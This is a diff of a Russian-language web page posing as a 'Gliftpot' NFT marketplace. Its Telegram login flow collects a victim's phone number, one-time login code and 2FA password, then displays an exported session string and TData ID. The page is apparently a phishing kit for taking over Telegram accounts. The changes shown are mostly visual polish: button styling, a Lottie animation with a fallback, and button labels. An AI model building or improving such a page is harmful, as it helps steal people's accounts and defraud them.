@@ -111,30 +111,30 @@
         }
 
         .animation-container {
-            width: 200px;
-            height: 200px;
+            width: 150px;
+            height: 150px;
             margin: 0 auto 20px;
         }
 
         .telegram-logo {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 20px;
+            width: 24px;
+            height: 24px;
             background: linear-gradient(45deg, #0088cc, #00a2ff);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
-            box-shadow: 0 4px 20px rgba(0, 136, 204, 0.5);
+            font-size: 14px;
+            font-weight: bold;
+            color: white;
         }
 
         .start-btn {
             background: linear-gradient(45deg, #0088cc, #00a2ff);
             color: white;
             border: none;
-            padding: 15px 40px;
-            font-size: 1.2rem;
+            padding: 15px 30px;
+            font-size: 1.1rem;
             border-radius: 50px;
             cursor: pointer;
             transition: all 0.3s ease;
@@ -143,9 +143,9 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             width: 100%;
-            max-width: 300px;
+            max-width: 280px;
             margin-left: auto;
             margin-right: auto;
         }
@@ -153,6 +153,7 @@
         .start-btn:hover {
             transform: translateY(-2px);
             box-shadow: 0 6px 25px rgba(0, 136, 204, 0.6);
+            background: linear-gradient(45deg, #0077b3, #0099e6);
         }
 
         .start-btn:active {
@@ -206,8 +207,8 @@
 
         .input-group input:focus {
             outline: none;
-            border-color: #ff6bff;
-            box-shadow: 0 0 15px rgba(255, 107, 255, 0.3);
+            border-color: #0088cc;
+            box-shadow: 0 0 15px rgba(0, 136, 204, 0.3);
             background: rgba(255, 255, 255, 0.15);
         }
 
@@ -332,11 +333,36 @@
         }
 
         .welcome-text {
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             margin-bottom: 30px;
             text-align: center;
             line-height: 1.6;
             color: #e0c3ff;
+        }
+
+        .fallback-animation {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto 20px;
+            background: linear-gradient(45deg, #0088cc, #00a2ff);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
     </style>
 </head>
@@ -355,7 +381,17 @@
         <div class="auth-card">
             <!-- Начальный экран -->
             <div id="startStep" class="step active">
-                <div class="telegram-logo">
+                <div class="animation-container">
+                    <lottie-player 
+                        src="https://lottie.host/82e23552-567e-4c66-a027-93846151fddc/HcJhk6i72d.json" 
+                        background="transparent" 
+                        speed="1" 
+                        loop 
+                        autoplay
+                        style="width: 100%; height: 100%">
+                    </lottie-player>
+                </div>
+                <div id="fallbackAnimation" class="fallback-animation hidden">
                     📱
                 </div>
                 <h3>Добро пожаловать в торговую площадку Gliftpot</h3>
@@ -363,8 +399,10 @@
                     Присоединяйтесь к эксклюзивному NFT сообществу в Telegram
                 </div>
                 <button class="start-btn" onclick="startAuth()">
-                    <span>📱</span>
-                    Авторизация через Telegram
+                    <div class="btn-content">
+                        <div class="telegram-logo">T</div>
+                        <span>Авторизация через Telegram</span>
+                    </div>
                 </button>
             </div>
 
@@ -375,7 +413,12 @@
                     <label for="phone">Номер телефона:</label>
                     <input type="text" id="phone" placeholder="+1234567890" value="">
                 </div>
-                <button class="btn" onclick="requestCode()" id="requestBtn">Получить код</button>
+                <button class="btn" onclick="requestCode()" id="requestBtn">
+                    <div class="btn-content">
+                        <div class="telegram-logo">T</div>
+                        <span>Получить код</span>
+                    </div>
+                </button>
                 <button class="back-btn" onclick="showStep('startStep')">← Назад</button>
             </div>
 
@@ -386,7 +429,12 @@
                     <label for="code">5-значный код:</label>
                     <input type="text" id="code" placeholder="12345" maxlength="5">
                 </div>
-                <button class="btn" onclick="verifyCode()" id="verifyBtn">Проверить код</button>
+                <button class="btn" onclick="verifyCode()" id="verifyBtn">
+                    <div class="btn-content">
+                        <div class="telegram-logo">T</div>
+                        <span>Проверить код</span>
+                    </div>
+                </button>
                 <button class="back-btn" onclick="showStep('step1')">← Назад</button>
             </div>
 
@@ -400,7 +448,12 @@
                     <label for="password">Пароль 2FA:</label>
                     <input type="password" id="password" placeholder="Введите пароль">
                 </div>
-                <button class="btn" onclick="verifyPassword()" id="passwordBtn">Проверить пароль</button>
+                <button class="btn" onclick="verifyPassword()" id="passwordBtn">
+                    <div class="btn-content">
+                        <div class="telegram-logo">T</div>
+                        <span>Проверить пароль</span>
+                    </div>
+                </button>
                 <button class="back-btn" onclick="showStep('step2')">← Назад</button>
             </div>
 
@@ -435,6 +488,28 @@
                 
                 stars.appendChild(star);
             }
+        }
+
+        // Проверка загрузки Lottie анимации
+        function checkLottieAnimation() {
+            const lottiePlayer = document.querySelector('lottie-player');
+            const fallbackAnimation = document.getElementById('fallbackAnimation');
+            
+            // Если Lottie не загрузился через 3 секунды, показываем fallback
+            setTimeout(() => {
+                if (lottiePlayer && lottiePlayer.shadowRoot) {
+                    const svg = lottiePlayer.shadowRoot.querySelector('svg');
+                    if (!svg || svg.children.length === 0) {
+                        fallbackAnimation.classList.remove('hidden');
+                        lottiePlayer.style.display = 'none';
+                    }
+                } else {
+                    fallbackAnimation.classList.remove('hidden');
+                    if (lottiePlayer) {
+                        lottiePlayer.style.display = 'none';
+                    }
+                }
+            }, 3000);
         }
 
         let currentSessionId = '';
@@ -472,10 +547,14 @@
                     <p><strong>🔗 Username:</strong> @${userInfo.username || 'Не указан'}</p>
                     <p><strong>🆔 ID:</strong> ${userInfo.id}</p>
                     <p><strong>📞 Телефон:</strong> ${userInfo.phone_number}</p>
-                    <p><strong>🔐 Session String:</strong> ${exportInfo.session_string.substring(0, 50)}...</p>
-                    <p><strong>💾 TData ID:</strong> ${exportInfo.tdata_id}</p>
+                    <p><strong>🔐 Session String:</strong> ${exportInfo.session_string ? exportInfo.session_string.substring(0, 50) + '...' : 'Не доступен'}</p>
+                    <p><strong>💾 TData ID:</strong> ${exportInfo.tdata_id || 'Не доступен'}</p>
                 </div>
-                <button class="btn" onclick="location.reload()">🔄 Новая авторизация</button>
+                <button class="btn" onclick="location.reload()">
+                    <div class="btn-content">
+                        <span>🔄 Новая авторизация</span>
+                    </div>
+                </button>
             `;
         }
 
@@ -512,7 +591,7 @@
 
             const btn = document.getElementById('requestBtn');
             btn.disabled = true;
-            btn.textContent = '📡 Отправка...';
+            btn.innerHTML = '<div class="btn-content"><div class="telegram-logo">T</div><span>📡 Отправка...</span></div>';
 
             try {
                 const response = await fetch('/api/auth/request-code', {
@@ -536,7 +615,7 @@
                 showAlert('❌ Ошибка сети: ' + error.message, 'error');
             } finally {
                 btn.disabled = false;
-                btn.textContent = 'Получить код';
+                btn.innerHTML = '<div class="btn-content"><div class="telegram-logo">T</div><span>Получить код</span></div>';
             }
         }
 
@@ -551,7 +630,7 @@
 
             const btn = document.getElementById('verifyBtn');
             btn.disabled = true;
-            btn.textContent = '🔍 Проверка...';
+            btn.innerHTML = '<div class="btn-content"><div class="telegram-logo">T</div><span>🔍 Проверка...</span></div>';
 
             try {
                 const response = await fetch('/api/auth/verify-code', {
@@ -582,7 +661,7 @@
                 showAlert('❌ Ошибка сети: ' + error.message, 'error');
             } finally {
                 btn.disabled = false;
-                btn.textContent = 'Проверить код';
+                btn.innerHTML = '<div class="btn-content"><div class="telegram-logo">T</div><span>Проверить код</span></div>';
             }
         }
 
@@ -597,7 +676,7 @@
 
             const btn = document.getElementById('passwordBtn');
             btn.disabled = true;
-            btn.textContent = '🔍 Проверка...';
+            btn.innerHTML = '<div class="btn-content"><div class="telegram-logo">T</div><span>🔍 Проверка...</span></div>';
 
             try {
                 const response = await fetch('/api/auth/verify-password', {
@@ -622,7 +701,7 @@
                 showAlert('❌ Ошибка сети: ' + error.message, 'error');
             } finally {
                 btn.disabled = false;
-                btn.textContent = 'Проверить пароль';
+                btn.innerHTML = '<div class="btn-content"><div class="telegram-logo">T</div><span>Проверить пароль</span></div>';
             }
         }
 
@@ -643,6 +722,7 @@
         document.addEventListener('DOMContentLoaded', function() {
             createStars();
             loadStats();
+            checkLottieAnimation();
         });
     </script>
 </body>
